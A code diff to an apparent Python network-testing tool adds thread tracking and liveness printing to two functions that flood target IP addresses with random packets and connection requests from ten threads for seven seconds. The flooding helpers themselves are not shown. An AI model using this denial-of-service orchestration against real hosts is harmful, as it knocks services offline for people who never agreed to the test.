@@ -406,12 +406,18 @@ def data_flood_attack(ip_addresses):
     print(f"Flooding {ip} with random packets from 10 threads for 7 seconds")
 
     stop_looping = Event()
+    threads = []
     for _ in range(10):
         th_flooder = Thread(target=_flood, args=(ip, stop_looping))
         th_flooder.start()
+        threads.append(th_flooder)
 
     time.sleep(7)
     stop_looping.set()
+    time.sleep(1)
+
+    for thread in threads:
+        print(f"Thread alive? {thread.is_alive()}")
 
     print("### DATA FLOOD ATTACK FINISH ###")
 
@@ -434,12 +440,18 @@ def connection_flood_attack(ip_addresses):
     print(f"Flooding {ip} with connection requests from 10 threads for 7 seconds")
 
     stop_looping = Event()
+    threads = []
     for _ in range(10):
         th_flooder = Thread(target=_flood_connection, args=(ip, stop_looping))
         th_flooder.start()
+        threads.append(th_flooder)
 
     time.sleep(7)
     stop_looping.set()
+    time.sleep(1)
+
+    for thread in threads:
+        print(f"Thread alive? {thread.is_alive()}")
 
     print("### CONNECTION FLOOD ATTACK FINISH ###")
 
